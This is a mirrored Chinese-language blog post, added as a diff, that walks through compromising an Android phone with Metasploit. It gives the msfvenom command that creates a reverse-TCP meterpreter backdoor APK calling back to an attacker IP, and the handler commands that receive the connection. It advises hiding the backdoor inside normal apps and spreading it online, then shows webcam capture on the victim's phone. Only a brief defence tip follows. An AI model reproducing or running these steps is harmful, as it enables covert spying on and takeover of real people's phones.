@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/kali-linux-metasploit-hack-android/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:17:38 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>演示使用Metasploit入侵Android</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="文本演示怎么使用Kali Linux入侵Android手机。
+
+" />
+    <meta property="og:description" content="文本演示怎么使用Kali Linux入侵Android手机。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="演示使用Metasploit入侵Android" />
+    <meta property="twitter:title" content="演示使用Metasploit入侵Android" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>演示使用Metasploit入侵Android</h1>
+
+  <div class="entry">
+    <p>文本演示怎么使用Kali Linux入侵Android手机。</p>
+
+<p>Kali Linux IP地址：192.168.0.112；接收连接的端口：443。</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-18%2010-16-04.png" alt="kali Linux ip" /></p>
+
+<p>同一局域网内android手机一部(android 5.1)</p>
+
+<h3 id="创建一个后门程序">创建一个后门程序</h3>
+
+<p>在终端中执行：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=443 &gt; my_backdoor.apk</span></code></pre></figure>
+
+<p>这个后门程序(APK)是发送给受害者的；要把上面命令的IP地址替换为攻击者IP，当后门程序运行时，它会试图连接这个IP。</p>
+
+<h3 id="启动metasploit等待受害者启动后门程序">启动Metasploit－等待受害者启动后门程序</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># msfconsole</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screen%20Shot%202016-04-18%20at%2010.40.42.png" alt="Metasploit 黑 Android" /></p>
+
+<p>依次执行：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf &gt; use exploit/multi/handler
+    &gt; <span class="nb">set </span>payload android/meterpreter/reverse_tcp
+    &gt; <span class="nb">set </span>lhost 192.168.0.112
+    &gt; <span class="nb">set </span>lport 443
+    &gt; exploit</code></pre></figure>
+
+<p><img src="../images/2016/4/Screen%20Shot%202016-04-18%20at%2010.46.23.png" alt="Metasploit 黑 Android" /></p>
+
+<h3 id="分发后门程序">分发后门程序</h3>
+
+<p>一般后门程序都打包到正常app中，反正就是各种藏；</p>
+
+<p>借助internet分发后门程序。</p>
+
+<p>闲话不多书，这里我在自己的android手机上安装运行带后门的apk。</p>
+
+<p><img src="../images/2016/4/S60418-105349.jpg" alt="Metasploit 黑 Android" /></p>
+
+<p>病毒！！！</p>
+
+<h3 id="控制受害者手机">控制受害者手机</h3>
+
+<p>受害者运行后门程序之后，就可以使用Metasploit控制他了：</p>
+
+<p><img src="../images/2016/4/Screen%20Shot%202016-04-18%20at%2011.00.09.png" alt="Kali Linux 黑 Android" /></p>
+
+<p>使用help查看可以使用的命令：</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-18%2011-16-27.png" alt="Kali Linux 黑 Android" /></p>
+
+<p>例如使用对方的摄像头拍照：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="gp">&gt; </span>webcam_list
+<span class="gp">&gt; </span>webcam_snap</code></pre></figure>
+
+<hr />
+
+<p>怎么防范：</p>
+
+<ul>
+  <li>不要安装不信任的apk</li>
+  <li>如果你非要安装未知来源的apk，你可以使用android逆向工程查看apk的代码。<a href="../start-learn-android-reversing/index.html">学习Android逆向工程</a></li>
+</ul>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-18%2011-27-38.png" alt="Kali Linux 黑 Android" /></p>
+
+<hr />
+
+<p><a href="../kali-linux-metasploit-base-use/index.html">Metasploit的基本使用</a></p>
+
+<p><a href="../kali-linux-n-hack-windows-xp/index.html">演示使用Metasploit入侵Windows</a></p>
+
+  </div>
+
+  <div class="date">
+    Written on April 18, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/kali-linux-metasploit-hack-android/',
+		  'title': '演示使用Metasploit入侵Android'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/kali-linux-metasploit-hack-android/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:18:46 GMT -->
+</html>
